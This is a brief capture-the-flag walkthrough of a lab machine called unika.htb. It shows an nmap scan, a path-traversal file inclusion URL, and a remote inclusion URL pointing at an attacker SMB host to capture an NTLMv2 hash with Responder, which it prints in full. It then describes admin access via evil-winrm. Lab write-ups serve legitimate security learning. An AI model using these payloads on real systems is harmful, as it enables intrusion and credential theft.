Started the namp scan 
```
PORT   STATE SERVICE
80/tcp open  http
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
```

We went to the webserver and redirects us to a website need to add to are host file
```
http://unika.htb/
```

We have found a LFI in the website
```
http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
```

So now after looking at the php.ini file and can see we can RFI was well so we setup responder and got a hash
```
http://unika.htb/index.php?page=//10.10.14.229/somefile
```
```
[SMB] NTLMv2-SSP Client   : 10.129.125.152
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:2771505890c663c2:B7F25528BCDFA00E8A921AF2C4732FC5:010100000000000000E11BB3F870DA01BA9475685DC1DC8C00000000020008005A0032004200480001001E00570049004E002D0033004F00430056004F004D00320041005A003600560004003400570049004E002D0033004F00430056004F004D00320041005A00360056002E005A003200420048002E004C004F00430041004C00030014005A003200420048002E004C004F00430041004C00050014005A003200420048002E004C004F00430041004C000700080000E11BB3F870DA0106000400020000000800300030000000000000000100000000200000094C9DC3AD962539C25C05CB540C2AF13860F7198C1BEBB53BE935A52ED2C4560A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003200320039000000000000000000
```
```
<Redacted>        (Administrator)
```
Used eveil-winrm could not get the port in the full portscan but its part of this room and now we have admin

Found the flag 
```
C:\Users\mike\Desktop\flag.txt
```
